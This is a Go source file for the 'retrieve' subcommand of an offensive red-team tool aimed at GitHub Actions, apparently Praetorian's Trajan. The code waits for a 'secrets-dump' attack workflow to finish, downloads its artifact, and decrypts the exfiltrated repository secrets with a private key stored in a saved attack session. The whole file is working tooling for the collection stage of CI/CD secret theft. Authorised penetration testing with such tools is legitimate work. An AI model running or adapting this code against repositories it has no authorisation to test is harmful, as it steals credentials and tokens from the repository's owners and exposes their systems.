package github

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/praetorian-inc/trajan/internal/cmdutil"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/crypto"
	"github.com/praetorian-inc/trajan/pkg/github"
	"github.com/praetorian-inc/trajan/pkg/platforms"
)

var (
	retrieveRunID int64
	retrieveRepo  string
	retrieveWait  time.Duration
)

var retrieveCmd = &cobra.Command{
	Use:   "retrieve",
	Short: "Retrieve and decrypt secrets from a workflow run",
	Long: `Trajan - GitHub - Retrieve

Download and decrypt artifacts from a secrets-dump workflow run.

After running 'trajan github attack --plugin secrets-dump', use this command
to retrieve the exfiltrated secrets once the workflow completes.`,
	RunE: runRetrieve,
}

func init() {
	retrieveCmd.Flags().SortFlags = false
	retrieveCmd.Flags().Int64Var(&retrieveRunID, "run-id", 0, "workflow run ID to retrieve artifacts from")
	retrieveCmd.Flags().StringVar(&retrieveRepo, "repo", "", "repository (owner/repo) - auto-detected from session if not specified")
	retrieveCmd.Flags().DurationVar(&retrieveWait, "wait", 5*time.Minute, "max time to wait for workflow completion")
	_ = retrieveCmd.MarkFlagRequired("run-id")
}

func runRetrieve(cmd *cobra.Command, args []string) error {
	if retrieveRunID == 0 {
		return fmt.Errorf("--run-id is required")
	}

	// Find session containing this run ID
	privateKeyPEM, repo, err := findRunInSessions(retrieveRunID)
	if err != nil {
		return fmt.Errorf("finding session for run %d: %w", retrieveRunID, err)
	}

	// Allow --repo to override
	if retrieveRepo != "" {
		repo = retrieveRepo
	}

	if repo == "" {
		return fmt.Errorf("could not determine repository - use --repo flag")
	}

	// Parse owner/repo
	parts := strings.SplitN(repo, "/", 2)
	if len(parts) != 2 {
		return fmt.Errorf("invalid repo format: %s (expected owner/repo)", repo)
	}
	owner, repoName := parts[0], parts[1]

	// Initialize GitHub client
	t := getToken(cmd)
	if t == "" {
		return fmt.Errorf("no token provided (use --token or set GH_TOKEN)")
	}

	platform, err := registry.GetPlatform("github")
	if err != nil {
		return fmt.Errorf("getting GitHub platform: %w", err)
	}
	initConfig := platforms.Config{
		Token:       t,
		Concurrency: 10,
	}
	if url := getURL(cmd); url != "" {
		initConfig.BaseURL = url
	}
	cmdutil.ApplyProxyFlags(cmd, &initConfig)
	if err := platform.Init(context.Background(), initConfig); err != nil {
		return fmt.Errorf("initializing GitHub platform: %w", err)
	}
	ghPlatform, ok := platform.(*github.Platform)
	if !ok {
		return fmt.Errorf("unexpected platform type")
	}

	client := ghPlatform.Client()
	ctx := context.Background()

	// Wait for workflow to complete
	fmt.Fprintf(os.Stderr, "Waiting for workflow run %d to complete...\n", retrieveRunID)
	startTime := time.Now()
	for {
		run, err := client.GetWorkflowRun(ctx, owner, repoName, retrieveRunID)
		if err != nil {
			return fmt.Errorf("getting workflow run: %w", err)
		}

		if run.Status == "completed" {
			if run.Conclusion != "success" {
				fmt.Fprintf(os.Stderr, "Warning: workflow concluded with %q\n", run.Conclusion)
			}
			fmt.Fprintf(os.Stderr, "Workflow completed (conclusion: %s)\n", run.Conclusion)
			break
		}

		if time.Since(startTime) > retrieveWait {
			return fmt.Errorf("timed out waiting for workflow run %d (status: %s)", retrieveRunID, run.Status)
		}

		fmt.Fprintf(os.Stderr, "  Status: %s, waiting...\n", run.Status)
		time.Sleep(5 * time.Second)
	}

	// List artifacts
	artifacts, err := client.ListWorkflowRunArtifacts(ctx, owner, repoName, retrieveRunID)
	if err != nil {
		return fmt.Errorf("listing artifacts: %w", err)
	}

	if len(artifacts) == 0 {
		return fmt.Errorf("no artifacts found for run %d", retrieveRunID)
	}

	// Download the "files" artifact
	var targetArtifact *github.WorkflowArtifact
	for i := range artifacts {
		if artifacts[i].Name == "files" {
			targetArtifact = &artifacts[i]
			break
		}
	}
	if targetArtifact == nil {
		// Fall back to first artifact
		targetArtifact = &artifacts[0]
		fmt.Fprintf(os.Stderr, "Warning: 'files' artifact not found, using %q\n", targetArtifact.Name)
	}

	fmt.Fprintf(os.Stderr, "Downloading artifact %q (%d bytes)...\n", targetArtifact.Name, targetArtifact.Size)
	zipData, err := client.DownloadArtifact(ctx, owner, repoName, targetArtifact.ID)
	if err != nil {
		return fmt.Errorf("downloading artifact: %w", err)
	}

	// Extract files from zip
	encryptedSecrets, encryptedKey, err := extractArtifactFiles(zipData)
	if err != nil {
		return fmt.Errorf("extracting artifact: %w", err)
	}

	// Parse private key
	block, _ := pem.Decode([]byte(privateKeyPEM))
	if block == nil {
		return fmt.Errorf("failed to decode private key PEM")
	}

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("parsing private key: %w", err)
	}

	// Decrypt secrets
	decrypted, err := crypto.DecryptSecrets(privateKey, encryptedKey, encryptedSecrets)
	if err != nil {
		return fmt.Errorf("decrypting secrets: %w", err)
	}

	// Output
	outputFormat := cmdutil.GetOutput(cmd)
	switch outputFormat {
	case "json":
		// Try to parse as JSON for pretty printing
		var parsed interface{}
		if json.Unmarshal(decrypted, &parsed) == nil {
			enc := json.NewEncoder(os.Stdout)
			enc.SetIndent("", "  ")
			return enc.Encode(map[string]interface{}{
				"run_id":  retrieveRunID,
				"repo":    repo,
				"secrets": parsed,
			})
		}
		// Fall through to raw output if not valid JSON
		fmt.Println(string(decrypted))
	default:
		fmt.Printf("=== Decrypted Secrets (Run: %d, Repo: %s) ===\n", retrieveRunID, repo)
		fmt.Println(string(decrypted))
	}

	return nil
}

// findRunInSessions searches all saved sessions for a result with the given run ID.
func findRunInSessions(runID int64) (privateKeyPEM string, repo string, err error) {
	sessions, err := attacks.ListSessions()
	if err != nil {
		return "", "", fmt.Errorf("listing sessions: %w", err)
	}

	for _, summary := range sessions {
		session, err := attacks.LoadSession(summary.ID)
		if err != nil {
			continue
		}

		for _, result := range session.Results {
			if result.Data == nil {
				continue
			}

			// Data is stored as map[string]interface{}
			dataMap, ok := result.Data.(map[string]interface{})
			if !ok {
				continue
			}

			resultRunID, ok := dataMap["run_id"]
			if !ok {
				continue
			}

			// run_id may be float64 after JSON unmarshal
			var rid int64
			switch v := resultRunID.(type) {
			case float64:
				rid = int64(v)
			case int64:
				rid = v
			case json.Number:
				n, _ := v.Int64()
				rid = n
			default:
				continue
			}

			if rid == runID {
				pkey, _ := dataMap["private_key_pem"].(string)
				repoValue := result.Repo
				if repoValue == "" {
					repoValue = session.Target.Value
				}
				return pkey, repoValue, nil
			}
		}
	}

	return "", "", fmt.Errorf("no session found containing run ID %d", runID)
}

// extractArtifactFiles extracts output_updated.json and lookup.txt from a zip archive.
func extractArtifactFiles(zipData []byte) (encryptedSecrets, encryptedKey []byte, err error) {
	reader, err := zip.NewReader(bytes.NewReader(zipData), int64(len(zipData)))
	if err != nil {
		return nil, nil, fmt.Errorf("opening zip: %w", err)
	}

	for _, f := range reader.File {
		rc, err := f.Open()
		if err != nil {
			return nil, nil, fmt.Errorf("opening %s: %w", f.Name, err)
		}

		data, err := io.ReadAll(rc)
		_ = rc.Close()
		if err != nil {
			return nil, nil, fmt.Errorf("reading %s: %w", f.Name, err)
		}

		switch {
		case strings.HasSuffix(f.Name, "output_updated.json"):
			encryptedSecrets = data
		case strings.HasSuffix(f.Name, "lookup.txt"):
			encryptedKey = data
		}
	}

	if encryptedSecrets == nil {
		return nil, nil, fmt.Errorf("output_updated.json not found in artifact")
	}
	if encryptedKey == nil {
		return nil, nil, fmt.Errorf("lookup.txt not found in artifact")
	}

	return encryptedSecrets, encryptedKey, nil
}
